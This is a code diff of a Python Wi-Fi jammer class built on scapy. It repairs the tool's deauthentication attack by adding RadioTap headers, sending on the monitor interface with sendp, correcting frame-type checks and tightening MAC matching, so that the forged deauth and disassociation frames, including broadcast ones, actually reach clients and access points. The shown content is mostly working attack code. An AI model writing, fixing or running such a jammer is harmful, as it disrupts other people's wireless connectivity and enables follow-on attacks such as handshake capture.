@@ -11,8 +11,7 @@ import subprocess
 
 from scapy.all import (
     Dot11, Dot11Deauth, Dot11Disas, RadioTap,
-    sendp, send, sniff, conf, Dot11Beacon, Dot11ProbeResp,
-    Dot11AssoReq, Dot11AssoResp, Dot11Auth, Dot11Elt
+    sendp, sniff, conf, Dot11Beacon, Dot11ProbeResp, Dot11Elt
 )
 
 import pyric.pyw as pyw
@@ -100,7 +99,7 @@ class wifijammer:
             if self.mChannels == []:
                 self.mChannels = list(ALL_VALID_CHANNELS)
 
-        if pyw.modeget(self.mInterface) != 'monitor':
+        if pyw.modeget(pyw.getcard(self.mInterface)) != 'monitor':
             logging.debug('Enabling monitor mode on interface '+self.mInterface)
             start_mon_mode(self.mInterface)
 
@@ -147,7 +146,7 @@ class wifijammer:
             else:
 
                 with threadLock:
-                    self.mChannel = str(self.mChannels[channelCounter])
+                    self.mChannel = self.mChannels[channelCounter]
 
                 channelCounter +=1
 
@@ -167,7 +166,7 @@ class wifijammer:
                 time.sleep(.1)
 
             else:
-                if self.firstPass == 1:
+                if self.firstPass:
                     time.sleep(3.5)
                     continue
 
@@ -243,10 +242,10 @@ class wifijammer:
                     ch = x[2]
                     # print(str(ch)+":"+str(self.mChannel))
                     if int(ch) == int(self.mChannel):
-                        deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
-                        deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
-                        disas_pkt1 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Disas()
-                        disas_pkt2 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Disas()
+                        deauth_pkt1 = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
+                        deauth_pkt2 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
+                        disas_pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Disas()
+                        disas_pkt2 = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Disas()
                         pkts.append(deauth_pkt1)
                         pkts.append(deauth_pkt2)
 
@@ -261,13 +260,13 @@ class wifijammer:
                         ch = a[1]
                         # print(str(ch)+":"+str(self.mChannel))
                         if int(ch) == int(self.mChannel):
-                            deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
+                            deauth_ap = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap, addr3=ap)/Dot11Deauth()
                             pkts.append(deauth_ap)
 
         if len(pkts) > 0:
             for p in pkts:
                 # print("Deauth")
-                send(p, inter=float(self.mTimeout), count=self.mPackets)
+                sendp(p, iface=self.mInterface, inter=float(self.mTimeout), count=self.mPackets, verbose=0)
 
     def noise_filter(self, addr1, addr2):
         if len([y for y in self.mIgnoreList if addr1.startswith(y) or addr2.startswith(y)]) > 0:
@@ -288,8 +287,8 @@ class wifijammer:
                 if self.noise_filter(pkt.addr1, pkt.addr2):
                     return
 
-                # Management = 1, data = 2
-                if pkt.type in [1, 2]:
+                # Management = 0, Data = 2
+                if pkt.type in [0, 2]:
                     self.clients_add(pkt.addr1, pkt.addr2)
         return
 
@@ -299,7 +298,7 @@ class wifijammer:
 
         try:
             # Thanks to airoscapy for below
-            if int(self.mChannel) < 14:
+            if int(self.mChannel) <= 14:
                 ch_byte = pkt[Dot11Elt:3].info
                 # In Python 3, indexing bytes returns int directly; no ord() needed
                 ap_channel = str(ch_byte[0] if isinstance(ch_byte, bytes) else ord(ch_byte))
@@ -351,7 +350,7 @@ class wifijammer:
 
     def AP_check(self, addr1, addr2):
         for ap in self.APs:
-            if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
+            if ap[0].lower() == addr1.lower() or ap[0].lower() == addr2.lower():
                 with threadLock:
                     return self.clients.append([addr1, addr2, ap[1], ap[2]])
 
